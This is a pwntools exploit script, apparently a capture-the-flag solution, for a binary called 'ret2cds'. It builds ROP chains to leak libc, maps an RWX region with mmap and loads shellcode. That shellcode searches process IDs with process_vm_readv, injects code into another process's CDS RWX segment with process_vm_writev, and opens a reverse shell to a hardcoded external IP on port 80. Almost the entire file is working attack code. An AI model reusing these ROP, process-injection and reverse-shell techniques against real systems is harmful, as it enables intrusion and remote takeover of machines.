#!/usr/bin/env python3

from pwn import *

the_binary = "./ret2cds"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
elif args.STRACE:
    io = process(["strace", "-o", "trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        break *0x4012ba
        ignore 1 2

        # set breakpoint pending on
        # break *0xdead0000

        continue
    """)

def libc_off(offset):
    return libc.address + offset

class Gadgets:
    elf_main = 0x40123a

    # 0x0000000000401016: ret;
    ret = 0x0000000000401016

    # 0x000000000040131b: pop rdi; ret;
    pop_rdi = 0x000000000040131b

    # 0x0000000000401319: pop rsi; pop r15; ret;
    pop_rsi_pop_r15 = 0x0000000000401319

    # 0x00000000001626d6: pop rdx; pop rbx; ret;
    @property
    def pop_rdx_pop_rbx(self):
        return libc_off(0x00000000001626d6)

    # 0x000000000004a550: pop rax; ret;
    @property
    def pop_rax(self):
        return libc_off(0x000000000004a550)

    # 0x00000000001536e9: pop rax; call rax;
    @property
    def pop_rax_call_rax(self):
        return libc_off(0x00000000001536e9)

    # 0x0000000000156108: mov r8, rax; mov rax, r8; pop rbx; ret;
    @property
    def mov_r8_rax_mov_rax_r8_pop_rbx(self):
        return libc_off(0x0000000000156108)

    # 0x000000000007d2f0: mov r9, rax; pop r12; pop r13; mov rax, r9; pop r14; ret;
    @property
    def mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14(self):
        return libc_off(0x000000000007d2f0)

    # 0x000000000007b0cb: mov r10, rdx; jmp rax;
    @property
    def mov_r10_rdx_jmp_rax(self):
        return libc_off(0x000000000007b0cb)

    # 0x0000000000066229: syscall; ret;
    @property
    def syscall(self):
        return libc_off(0x0000000000066229)

class Const:
    rip_offset = 0x108

    SYS_process_vm_readv = 310
    SYS_process_vm_writev = 311

    mmap_base = 0xdead0000
    iovec_local = 0xdead3000
    iovec_remote = 0xdead6000
    iovec_size = 0x3000
    mmap_size = 0x9000

    hello_msg = "hello"
    msg_prologue = "__mbegin__"
    msg_epilogue = "__mend__"
    process_read_err = "pread err"
    process_write_err = "pwrite err"

    # CDS leads to RWX segment at static address, more context here:
    # https://docs.oracle.com/javase/8/docs/technotes/guides/vm/class-data-sharing.html
    cds_rwx_base = 0x800000000
    cds_len_to_read = 1
    cds_rwx_size = 0x2000

    # final_payload_listen_host = "172.17.0.1"
    final_payload_listen_host = "137.184.74.226"
    final_payload_listen_port = 80

shellcode = f"""
    jmp do_it

hello_msg:
    .string "{Const.hello_msg}"
    .byte 0
process_read_err:
    .string "{Const.process_read_err}"
    .byte 0
process_write_err:
    .string "{Const.process_write_err}"
    .byte 0
msg_prologue:
    .string "{Const.msg_prologue}"
    .byte 0
msg_epilogue:
    .string "{Const.msg_epilogue}"
    .byte 0

do_it:
    lea rdi,[rip+hello_msg]
    mov rsi,{len(Const.hello_msg)}
    call echo_msg

    /* Read process mem loop to find target process PID. */
    mov rbx,1
pid_search_loop:
    /* Main loop, current PID search value expected in rbx. */
    push rbx
    mov rdi,rbx
    mov rsi,{hex(Const.cds_rwx_base)}
    mov rdx,1
    call read_process_mem
    cmp rax,1
    jne bad_pread
    /* We found the PID. Send it to ourselves and then jump to writing
       shellcode into its address space. */
    lea rdi,[rsp]
    mov rsi,8
    call echo_msg
    pop rbx
    jmp write_shellcode
bad_pread:
    /* Didn't find the PID, increment our counter and continue the search. */
    pop rbx
    inc rbx
    jmp pid_search_loop

    /* Write shellcode to the identified parent process. Expects the target
       PID in rbx. */
write_shellcode:
    mov rdi,rbx
    lea rsi,[rip+final_shellcode]
    mov rdx,the_end - final_shellcode
    mov r10,{hex(Const.cds_rwx_base)}
    call write_process_mem

    call exit

/* Args:
    - rdi: Address holding the data to print.
    - rsi: Length of data to print.
*/
echo_data:
    mov rdx,rsi
    mov rsi,rdi
    mov rdi,STDOUT_FILENO
    mov rax,SYS_write
    syscall
    ret

echo_prologue:
    lea rdi,[rip+msg_prologue]
    mov rsi,{len(Const.msg_prologue)}
    call echo_data
    ret

echo_epilogue:
    lea rdi,[rip+msg_epilogue]
    mov rsi,{len(Const.msg_epilogue)}
    call echo_data
    ret

/* Same as echo_data, but prepends and appends a message prologue/epilogue. */
echo_msg:
    push rdi
    push rsi
    call echo_prologue
    pop rsi
    pop rdi
    call echo_data
    call echo_epilogue
    ret

/* Args:
    - rdi: PID of process whose memory to read.
    - rsi: Memory address to read from
    - rdx: Length of region to read
   Returns: 1 on success, 0 on error.
*/
read_process_mem:
    mov rcx,rsi
    mov rbx,rdx
    /* Setup local iovec, indicating where to write the data read from the
      remote process. */
    mov rsi,{hex(Const.iovec_local)}
    mov dword ptr [rsi+0],{hex(Const.iovec_local+0x10)}
    mov [rsi+8],rbx
    mov rdx,1
    /* Setup remote iovec, indicating where we want to read from in the remote
       process. */
    mov r10,{hex(Const.iovec_remote)}
    mov [r10+0],rcx
    mov [r10+8],rbx
    mov r8,{Const.cds_len_to_read}
    /* No flags. */
    mov r9,0
    /* Do the syscall. */
    mov rax,{Const.SYS_process_vm_readv}
    syscall
    /* rax now holds how many bytes were read from the remote process memory,
       or -1 on error. */
    cmp rax,0
    jle read_process_mem_err
    /* No error, write the process memory back to ourselves. */
    mov rdi,{hex(Const.iovec_local+0x10)}
    mov rsi,rax
    call echo_msg
    mov rax,1
    ret
read_process_mem_err:
    lea rdi,[rip+process_read_err]
    mov rsi,{len(Const.process_read_err)}
    call echo_msg
    mov rax,0
    ret

/* Args:
    - rdi: PID of process whose memory to read.
    - rsi: Local memory address containing data to write
    - rdx: Length of data to write to remote process
    - r10: Remote memory address to write to
   Returns: 1 on success, 0 on error.
*/
write_process_mem:
    mov rbx,rsi
    mov rcx,rdx
    mov r12,r10
    /* Setup local iovec, indicating what local data should be written to the
       remote process. */
    mov rsi,{hex(Const.iovec_local)}
    mov [rsi+0],rbx
    mov [rsi+8],rcx
    mov rdx,1
    /* Setup remote iovec, indicating where we should be writing in the remote
       process. */
    mov r10,{hex(Const.iovec_remote)}
    mov [r10+0],r12
    mov [r10+8],rcx
    mov r8,1
    /* No flags. */
    mov r9,0
    /* Do the syscall. */
    mov rax,{Const.SYS_process_vm_writev}
    syscall
    /* rax now holds how many bytes were written to the remote process memory,
       or -1 on error. */
    cmp rax,0
    jle write_process_mem_err
    /* No error, return success. */
    mov rax,1
    ret
write_process_mem_err:
    lea rdi,[rip+process_write_err]
    mov rsi,{len(Const.process_write_err)}
    call echo_msg
    mov rax,0
    ret

exit:
    mov rax,SYS_exit
    syscall

final_shellcode:
    .rept 100
    nop
    .endr
"""
shellcode += shellcraft.connect(Const.final_payload_listen_host, Const.final_payload_listen_port)
shellcode += shellcraft.dupsh()
shellcode += """
the_end:
    nop
"""
shellcode = asm(shellcode, vma=Const.mmap_base)

def recv_shellcode_msg():
    io.recvuntil(Const.msg_prologue)
    msg = io.recvuntil(Const.msg_epilogue, drop=True) 
    return msg

g = Gadgets()

def do_rop(*gadgets):
    chain = b""
    chain += b"A"*Const.rip_offset
    chain += flat(*gadgets)
    assert len(chain) <= 0x200
    io.sendafter("warden: ", chain)

if args.PAUSE:
    input("Pausing before sending anything...")

# leak a libc address
do_rop(
    g.pop_rdi,
    constants.STDOUT_FILENO,
    g.pop_rsi_pop_r15,
    elf.got.read,
    0xdeadbeef,
    # rdx already equals 0x1d from the program's last write
    elf.plt.write,
    g.elf_main
)
io.recvuntil("escaping...\n")
leak = io.recvuntil("Welcome", drop=True)
libc_read = u64(leak[1:9])
libc.address = libc_read - libc.sym.read
log.info("read@libc: %#x" % libc_read)
log.info("libc base: %#x" % libc.address)

# map a rwx segment
do_rop(
    # rdi = addr
    g.pop_rdi,
    Const.mmap_base,
    # rsi = len
    g.pop_rsi_pop_r15,
    Const.mmap_size,
    0xdeadbeef,
    # r10 = flags
    g.pop_rax,
    g.ret,
    g.pop_rdx_pop_rbx,
    constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON,
    0xdeadbeef,
    g.mov_r10_rdx_jmp_rax,
    # rdx = prot; do this after r10 since r10's gadget clobbers rdx
    g.pop_rdx_pop_rbx,
    constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC,
    0xdeadbeef,
    # r8 = fd
    g.pop_rax,
    0xffffffffffffffff,
    g.mov_r8_rax_mov_rax_r8_pop_rbx,
    0xdeadbeef,
    # r9 = off
    g.pop_rax,
    0,
    g.mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    # rax = SYS_mmap
    g.pop_rax,
    constants.SYS_mmap,
    g.syscall,
    # back to main one last time...
    g.elf_main
)

# read shellcode into the rwx segment and jump to it
do_rop(
    # rdi = fd
    g.pop_rdi,
    constants.STDIN_FILENO,
    # rsi = buf
    g.pop_rsi_pop_r15,
    Const.mmap_base,
    0xdeadbeef,
    # rdx = len
    g.pop_rdx_pop_rbx,
    len(shellcode),
    0xdeadbeef,
    # rax = SYS_read
    g.pop_rax,
    constants.SYS_read,
    g.syscall,
    # jump to shellcode
    g.pop_rax_call_rax,
    Const.mmap_base
)

sleep(5)
log.info("Sending shellcode...")
io.send(shellcode)

callback_io = listen(
    bindaddr=Const.final_payload_listen_host,
    port=Const.final_payload_listen_port
)

# Make sure our shellcode starts up as expected.
assert recv_shellcode_msg().decode() == Const.hello_msg
log.info("Got hello message from compromised ret2cds process")

# Barring a successful write into the target process's address space, we can
# now expect a reverse shell to our listener.
log.info("Waiting for callback...")
callback_io.wait_for_connection()
log.success("Got connection!")
callback_io.interactive()
